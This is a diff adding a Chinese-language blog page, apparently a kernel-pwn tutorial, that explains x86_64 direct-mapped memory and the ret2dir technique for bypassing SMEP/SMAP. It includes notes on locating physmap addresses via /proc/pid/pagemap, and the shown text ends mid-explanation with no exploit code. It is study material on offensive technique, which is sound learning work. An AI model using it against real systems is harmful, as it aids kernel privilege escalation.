@@ -1,0 +1,1122 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    
+    <meta name="author" content="HackC0der">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes ASAP (before DOMContentLoaded)
+            (function() {
+                const addBodyClass = () => {
+                    const b = document.body;
+                    if (!b) return false;
+                    b.classList.add(theme + "-mode");
+                    return true;
+                };
+
+                // Try immediately
+                if (addBodyClass()) return;
+
+                // Observe until body exists
+                const mo = new MutationObserver(() => {
+                    if (addBodyClass()) mo.disconnect();
+                });
+                mo.observe(document.documentElement, { childList: true, subtree: true });
+            })();
+        })();
+    </script>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://HackC0der.github.io/2026/03/18/linux-kernel-pwn（五）ret2dir/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+        
+        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[Linux-Kernel-PWN] ret2dir &amp;&amp; pt_regs">
+<meta property="og:url" content="https://hackc0der.github.io/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hackc0der.github.io/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-03-18T00:48:40.000Z">
+<meta property="article:modified_time" content="2026-03-18T23:57:48.317Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Linux Kernel PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hackc0der.github.io/images/redefine-og.webp">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/%E6%A9%98%E7%8C%AB.ico" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/%E6%A9%98%E7%8C%AB.ico">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/%E6%A9%98%E7%8C%AB.ico">
+    <!--- Page Info-->
+    
+    <title>
+        
+            [Linux-Kernel-PWN] ret2dir &amp;&amp; pt_regs | HackC0der&#39;s Blog
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+    
+    
+        
+<script src="/js/build/libs/anime.min.js"></script>
+
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"hackc0der.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":true,"title_alignment":"left","headings_top_spacing":{"h1":"2.6rem","h2":"2.2rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1300px","sidebar_width":"400px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":true},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"What you have done does make who you are...","subtitle":{"text":["明月几时有，把酒问青天","不知天上宫阙，今夕是何年？","我欲乘风归去，又恐琼楼玉宇，高处不胜寒。","起舞弄清影，何似在人间！","转朱阁，低绮户，照无眠。","不应有恨，何事长向别时圆？","人有悲欢离合，月有阴晴圆缺，此事古难全。","但愿人长久，千里共婵娟。","我步入丛林，因为我希望活得有意义…","我希望活得深刻，汲取生命所有的精髓！","把非生命的一切全都击溃…","以免在我生命终结时，发现自己从来没有活过…"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":[{"icon":"fa-brands fa-github","url":"https://github.com/HackC0der"}],"qrs":[]}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1","theme":{"light":"default","dark":"dark"}}},"version":"2.9.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"CSDN":{"path":"https://blog.csdn.net/Mr_Fmnwon?type=blog","icon":"fa-sharp fa-solid fa-browser"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur","masonry":{"batch_size":12,"initial_batch_size":24}},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footer":{"runtime":true,"icon":"<i class=\"fa-solid fa-heart fa-beat\" style=\"--fa-animation-duration: 0.5s; color: #f54545\"></i>","start":"2025/11/27 23:36:22","statistics":true,"customize":null,"icp":{"enable":false,"number":null,"url":null}},"footerStart":"2025/11/27 23:36:22","mermaid":{"style":{"light":"default","dark":"dark"}}};
+    window.lang_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+    window.i18n = {"search":"站内搜索您需要的内容...","toc":"目录","prev":"上一页","next":"下一页","prev_posts":"上一篇","next_posts":"下一篇","page":"第 %d 页","recent_posts":"最新文章","share":"分享","powered_by":"由 %s 驱动","theme":"主题","rss_feed":"RSS Feed","category":"分类","categories":"分类","tag":"标签","tags":"标签","post":"文章","posts":"文章","tagcloud":"标签云","comment":"评论","comments":"评论","top":"置顶","sticky":"置顶","go-back-home":"回到首页","masonry_loading":"照片加载中...","image_viewer":"图片查看器","close":"关闭","exif":{"title":"EXIF","cards":{"camera":"相机","lens":"镜头","exposure":"曝光","other":"其他"},"fields":{"make":"品牌","model":"机型","date_taken":"拍摄时间","lens_model":"镜头","focal_length":"焦距","focus_mode":"对焦模式","shutter":"快门","aperture":"光圈","iso":"感光度","exposure_program":"曝光程序","exposure_compensation":"曝光补偿","metering_mode":"测光模式","flash":"闪光灯","white_balance":"白平衡","latitude":"纬度","longitude":"经度","altitude":"海拔"},"status":{"loading":"加载中...","no_exif":"无 EXIF 信息","library_missing":"EXIF 库未加载","image_source_missing":"图片地址不可用","unavailable":"EXIF 不可用（可能被 CORS 阻止或缺少元数据）","flag_unavailable":"EXIF 不可用"}},"home":"首页","archive":"归档","archives":"归档","about":"关于","links":"链接","link":"链接","friends":"友情链接","friend":"友情链接","timeline":"时间轴","shuoshuo":"说说","bookmarks":"书签","site_uv":"访问人数","site_pv":"总访问量","read_more":"阅读全文","wordcount":"字","min2read":"分钟","changelog":"更新日志","status":"状态","runtime":"博客已运行","days":"天","hours":"小时","minutes":"分钟","seconds":"秒","optimized_by":"并由 Evan 进行优化","rights":"版权所有","site_posts":"共撰写了 %s 篇文章","site_wordcount":"共 %s 字","copyright":{"title":"标题","author":"作者","link":"链接","create_time":"创建于","update_time":"更新于","license_title":"版权声明","license_content":"本文章采用 %s 进行许可。","all_rights_reserved":"版权所有 &#169 %s，禁止转载。","public_domain":"本文为公有领域作品，可自由转载、引用。"},"ago":{"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"},"create_time":"创建","update_time":"更新","expired":"这篇文章最后更新于 %s 天前，内容可能已经过时。"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    <h2 class="ml13">
+        HackC0der&#39;s Blog
+    </h2>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+        var animation = anime.timeline({ loop: true })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [20, 0],
+                translateZ: 0,
+                opacity: [0, 1],
+                filter: ['blur(5px)', 'blur(0px)'],
+                easing: "easeOutExpo",
+                duration: 1200,
+                delay: (el, i) => 300 + 20 * i,
+            })
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [0, -20],
+                opacity: [1, 0],
+                filter: ['blur(0px)', 'blur(5px)'],
+                easing: "easeInExpo",
+                duration: 1000,
+                delay: (el, i) => 15 * i,
+                complete: function() {
+                    hidePreloader();
+                }
+            }, '-=700');
+
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
+        });
+
+        function hidePreloader() {
+            var preloader = document.querySelector('.preloader');
+            preloader.style.opacity = '0';
+            setTimeout(function () {
+                preloader.style.display = 'none';
+            }, 200);
+        }
+    </script>
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                HackC0der&#39;s Blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    首页
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon?type=blog"
+                                        >
+                                    <i class="fa-sharp fa-solid fa-browser fa-fw"></i>
+                                    CSDN
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                首页
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           target="_blank" rel="noopener" href="https://blog.csdn.net/Mr_Fmnwon?type=blog"
+                        >
+                            <span>
+                                CSDN
+                            </span>
+                            
+                                <i class="fa-sharp fa-solid fa-browser fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">5</div>
+        <div class="label text-third-text-color text-sm">标签</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">分类</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">11</div>
+        <div class="label text-third-text-color text-sm">文章</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">[Linux-Kernel-PWN] ret2dir &amp;&amp; pt_regs</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/redefine-avatar.svg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">HackC0der</span>
+					
+					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-03-18 08:48:40</span>
+        <span class="mobile">2026-03-18 08:48:40</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-03-19 07:57:48</span>
+            <span class="mobile">2026-03-19 07:57:48</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/Linux-Kernel-PWN/">Linux Kernel PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.2k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>19 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<ol>
+<li><a class="link" target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/578569516">Linux内核 物理内存映射 - 知乎<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#%E4%BE%8B%E9%A2%98%EF%BC%9AMINI-LCTF2022-kgadget">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li><a class="link" target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/ret2dir/#final-exploit">ret2dir - CTF Wiki<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></li>
+<li></li>
+</ol>
+</blockquote>
+<p>ret2dir（return-to-direct-mapped memory）是哥伦比亚大学网络安全实验室在 2014 年提出的一种辅助攻击手法，，主要用来<strong>绕过 smep、smap、pxn 等用户空间与内核空间隔离的防护手段</strong>，原论文见此处<a class="link" target="_blank" rel="noopener" href="http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf">http://www.cs.columbia.edu/~vpk/papers/ret2dir.sec14.pdf<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<h2 id="一、direct-mapping-of-all-phys-memory"><a href="#一、direct-mapping-of-all-phys-memory" class="headerlink" title="一、direct mapping of all phys memory"></a>一、direct mapping of all phys memory</h2><p>可以通过查询文档中的<code>mm.rst</code>来查看某版本内核下内存空间的映射情况</p>
+<blockquote>
+<p>v6.18：<a class="link" target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v6.18/source/Documentation/arch/x86/x86_64/mm.rst">mm.rst - Documentation&#x2F;arch&#x2F;x86&#x2F;x86_64&#x2F;mm.rst - Linux source code v6.18 - Bootlin Elixir Cross Referencer<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+</blockquote>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/v2-299f666b5e3abba6d6c30157999de228_1440w.jpg" class title="v2-299f666b5e3abba6d6c30157999de228_1440w.jpg">
+
+<p>（图来自：<a class="link" target="_blank" rel="noopener" href="https://pic1.zhimg.com/v2-299f666b5e3abba6d6c30157999de228_1440w.jpg%EF%BC%89">https://pic1.zhimg.com/v2-299f666b5e3abba6d6c30157999de228_1440w.jpg）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 截取自v6.18的内存布局说明文档</span><br><span class="line">========================================================================================================================</span><br><span class="line">    Start addr    |   Offset   |     End addr     |  Size   | VM area description</span><br><span class="line">========================================================================================================================</span><br><span class="line"> ffff888000000000 | -119.5  TB | ffffc87fffffffff |   64 TB | direct mapping of all physical memory (page_offset_base)</span><br><span class="line">------------------------------------------------------------------------------------------------------------------------</span><br><span class="line"> ffffffff80000000 |   -2    GB | ffffffff9fffffff |  512 MB | kernel text mapping, mapped to physical address 0</span><br></pre></td></tr></table></figure></div>
+
+<p>上述两块区域都是直接映射区，地址连续，和物理地址空间是简单的线性映射关系。</p>
+<h3 id="kernel-text-mapping"><a href="#kernel-text-mapping" class="headerlink" title="kernel text mapping"></a>kernel text mapping</h3><img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/v2-993849df89f0f51879f9fd31165a219a_1440w.jpg" class title="v2-993849df89f0f51879f9fd31165a219a_1440w.jpg">
+
+<p>（图来自：<a class="link" target="_blank" rel="noopener" href="https://pic3.zhimg.com/v2-993849df89f0f51879f9fd31165a219a_1440w.jpg%EF%BC%89">https://pic3.zhimg.com/v2-993849df89f0f51879f9fd31165a219a_1440w.jpg）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>从 __START_KERNEL_map（0xffffffff80000000）开始的 512M 用于存放内核代码段、全局变量、BSS 等。这里对应到物理内存开始的位置，减去 __START_KERNEL_map 就能得到物理内存的地址。下图是v6.18内核文件通过IDA查看的结果，内核代码段的起始地址是：0xffffffff81000000。</p>
+<p>通过查看内核源码config文件，可定位到物理地址的起始偏移</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_PHYSICAL_START=0x1000000</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="direct-mapping-of-all-phys-memory"><a href="#direct-mapping-of-all-phys-memory" class="headerlink" title="direct mapping of all phys memory"></a>direct mapping of all phys memory</h3><img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/v2-95b433895a24e5bb8a93b734355eca88_1440w.jpg" class title="v2-95b433895a24e5bb8a93b734355eca88_1440w.jpg">
+
+<p>（图来自：<a class="link" target="_blank" rel="noopener" href="https://pica.zhimg.com/v2-95b433895a24e5bb8a93b734355eca88_1440w.jpg%EF%BC%89">https://pica.zhimg.com/v2-95b433895a24e5bb8a93b734355eca88_1440w.jpg）<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>从 0xffff800000000000 开始就是内核的部分，开始有 8T 的空档区域。从 __PAGE_OFFSET_BASE(0xffff880000000000) 开始的 64T 的虚拟地址空间是直接映射区域，也就是减去 PAGE_OFFSET 就是物理地址。</p>
+<p>这块区域把所有物理内存线性映射到PAGE_OFFSET虚拟地址。PAGE_OFFSET的值可能是固定的0xffff880000000000，或者KASLR使能后的随机地址page_offset_base。</p>
+<p>&#x2F;dev&#x2F;mem是物理地址空间，而操作系统操作的任何内存都基于虚拟地址。<br>（1）x86_64可以直接映射64T的物理内存(direct mapping of all phys. memory)，足以一一映射当前常见的任意物理内存。<br>（2）Linux内核对所有物理内存建立一一映射(kernel text mapping)。物理地址和虚拟地址之间固定偏移。</p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/1460000044047057.png" class title="1460000044047057.png">
+
+<h2 id="二、ret2dir利用原理"><a href="#二、ret2dir利用原理" class="headerlink" title="二、ret2dir利用原理"></a>二、ret2dir利用原理</h2><h3 id="线性映射区"><a href="#线性映射区" class="headerlink" title="线性映射区"></a>线性映射区</h3><blockquote>
+<p>我们如何在内核空间布置我们的恶意数据呢？可能有的人就会想到 <code>msg_msg</code> 、<code>sk_buff</code> 等一系列常用来进行堆喷的结构体，<strong>但其实我们并不需要显式地在内核空间布置数据，而是可以通过一个位于内核空间中的地址直接访问到用户空间中的数据</strong>——那就是映射了整个物理内存的 <code>direct mapping area</code></p>
+</blockquote>
+<p>由于在虚地址中的内容最终都会映射到物理地址上，若能将用户空间的数据同样映射到这段区域上，岂不是就可以在内核空间也可以访问到用户空间的数据了。该段区域也被称之为<code>phsymap</code>，它是一段大的，连续的虚拟内存区域，它包含了部分或全部的物理内存的直接映射。下图这种情况作者也称之为是虚拟地址别名的情况，因为在用户空间与内核空间中都存在一个地址可以访问<code>payload</code>。</p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/1460000044047058.png" class title="1460000044047058.png">
+
+<p>最终作者构想的攻击场景如下图所示（图片来自论文），不同于<code>ret2usr</code>，指针不再被修改为指向用户空间，而是指向了物理地址的直接映射区，由于该映射区指向物理地址，而在用户空间构造的<code>payload</code>也会映射到物理地址，因此若能获得指向存在<code>payload</code>的用户空间对应的物理地址在<code>phsymap</code>位置，就能够直接执行用户空间的<code>payload</code>。</p>
+<img lazyload src="/images/loading.svg" data-src="/2026/03/18/Linux-Kernel-PWN%EF%BC%88%E4%BA%94%EF%BC%89ret2dir/1460000044047059.png" class title="image-20230706120102411">
+
+<p>想要获得映射地址有以下方法</p>
+<p>（1）通过读取<code>/proc/pid/pagemap</code>获取，该文件中存放了物理地址与虚拟地址的映射关系，可是该文件需要<code>root</code>权限才能读取。</p>
